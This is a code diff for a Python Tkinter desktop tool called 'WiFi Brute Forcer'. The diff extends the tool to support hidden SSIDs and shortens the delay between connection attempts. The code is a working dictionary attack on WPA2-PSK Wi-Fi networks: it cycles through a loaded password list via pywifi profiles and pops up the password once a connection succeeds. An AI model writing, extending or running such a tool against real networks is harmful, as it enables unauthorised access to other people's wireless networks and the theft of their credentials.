@@ -13,31 +13,57 @@ class WifiBruteForcer:
     def __init__(self, master):
         self.master = master
         master.title("WiFi Brute Forcer (Windows)")
-        master.geometry("500x400")
+        master.geometry("520x480")
 
+        # Hidden SSID toggle
+        self.hidden_var = tk.BooleanVar()
+        hidden_frame = tk.Frame(master)
+        tk.Checkbutton(hidden_frame, text="Hidden SSID", variable=self.hidden_var,
+                       command=self._toggle_hidden).pack(side=tk.LEFT)
+        tk.Label(hidden_frame, text="Manual SSID:").pack(side=tk.LEFT, padx=(10,0))
+        self.ssid_entry = tk.Entry(hidden_frame, width=30, state=tk.DISABLED)
+        self.ssid_entry.pack(side=tk.LEFT)
+        hidden_frame.pack(pady=5)
+
+        # Scan and list
         self.scan_btn = tk.Button(master, text="Scan Networks", command=self.scan_networks)
         self.scan_btn.pack(pady=5)
 
-        self.network_listbox = tk.Listbox(master, selectmode=tk.SINGLE, width=60)
+        self.network_listbox = tk.Listbox(master, selectmode=tk.SINGLE, width=60, height=8)
         self.network_listbox.pack(pady=5)
 
+        # Dictionary load
         self.load_dict_btn = tk.Button(master, text="Load Dictionary", command=self.load_dictionary)
         self.load_dict_btn.pack(pady=5)
 
         self.dict_label = tk.Label(master, text="No dictionary loaded")
         self.dict_label.pack(pady=5)
 
+        # Start button
         self.start_btn = tk.Button(master, text="Start Brute Force", command=self.start_bruteforce)
         self.start_btn.pack(pady=10)
 
+        # Status label
         self.status_label = tk.Label(master, text="Status: Idle")
         self.status_label.pack(pady=5)
 
-        # Initialize pywifi interface
+        # Initialize wifi
         wifi = pywifi.PyWiFi()
         self.iface = wifi.interfaces()[0]
         self.networks = []
         self.dictionary = []
+
+    def _toggle_hidden(self):
+        # Enable manual entry when Hidden SSID is checked
+        if self.hidden_var.get():
+            self.ssid_entry.config(state=tk.NORMAL)
+            self.scan_btn.config(state=tk.DISABLED)
+            self.network_listbox.config(state=tk.DISABLED)
+        else:
+            self.ssid_entry.delete(0, tk.END)
+            self.ssid_entry.config(state=tk.DISABLED)
+            self.scan_btn.config(state=tk.NORMAL)
+            self.network_listbox.config(state=tk.NORMAL)
 
     def scan_networks(self):
         self.network_listbox.delete(0, tk.END)
@@ -64,19 +90,29 @@ class WifiBruteForcer:
             self.dict_label.config(text=f"Dictionary: {path} ({len(self.dictionary)} entries)")
 
     def start_bruteforce(self):
-        sel = self.network_listbox.curselection()
-        if not sel:
-            messagebox.showwarning("Warning", "Please select a network to attack.")
-            return
+        # Determine SSID
+        if self.hidden_var.get():
+            ssid = self.ssid_entry.get().strip()
+            if not ssid:
+                messagebox.showwarning("Warning", "Enter the hidden SSID first.")
+                return
+        else:
+            sel = self.network_listbox.curselection()
+            if not sel:
+                messagebox.showwarning("Warning", "Please select a network to attack.")
+                return
+            ssid = self.networks[sel[0]]
+
         if not self.dictionary:
             messagebox.showwarning("Warning", "Please load a password dictionary.")
             return
-        ssid = self.networks[sel[0]]
-        thread = threading.Thread(target=self.bruteforce, args=(ssid,))
-        thread.daemon = True
-        thread.start()
 
-    def bruteforce(self, ssid):
+        # Run brute in thread
+        t = threading.Thread(target=self.bruteforce, args=(ssid, self.hidden_var.get()))
+        t.daemon = True
+        t.start()
+
+    def bruteforce(self, ssid, hidden):
         self.status_label.config(text=f"Status: Attacking {ssid}...")
         for pwd in self.dictionary:
             self.status_label.config(text=f"Trying: {pwd}")
@@ -86,11 +122,18 @@ class WifiBruteForcer:
             profile.akm.append(const.AKM_TYPE_WPA2PSK)
             profile.cipher = const.CIPHER_TYPE_CCMP
             profile.key = pwd
+            if hidden:
+                # mark as hidden network
+                try:
+                    profile.hidden = True
+                except AttributeError:
+                    pass
 
+            # Attempt
             self.iface.remove_all_network_profiles()
-            tmp_profile = self.iface.add_network_profile(profile)
-            self.iface.connect(tmp_profile)
-            time.sleep(5)
+            tmp = self.iface.add_network_profile(profile)
+            self.iface.connect(tmp)
+            time.sleep(3)
 
             if self.iface.status() == const.IFACE_CONNECTED:
                 messagebox.showinfo("Success", f"Connected! SSID: {ssid}\nPassword: {pwd}")
@@ -99,6 +142,7 @@ class WifiBruteForcer:
             else:
                 self.iface.disconnect()
                 time.sleep(1)
+
         messagebox.showinfo("Finished", f"Brute force complete for {ssid}, no password found.")
         self.status_label.config(text="Status: Finished")
 
